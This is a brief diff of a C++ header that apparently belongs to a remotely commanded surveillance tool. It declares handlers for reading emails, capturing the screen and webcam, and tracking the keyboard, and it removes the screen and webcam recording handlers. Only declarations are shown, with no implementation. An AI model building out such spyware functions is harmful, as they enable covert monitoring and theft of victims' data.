@@ -37,10 +37,8 @@ public:
 	void handleReadRecentEmailsCommand(const Json::Value& command);
 
 	void handleCaptureScreen(const Json::Value& command);
-    void handleRecordScreen(const Json::Value& command);
 
     void handleCaptureWebcam(const Json::Value& command);
-	void handleRecordWebcam(const Json::Value& command);
 
 	void handleTrackKeyboard(const Json::Value& command);
 
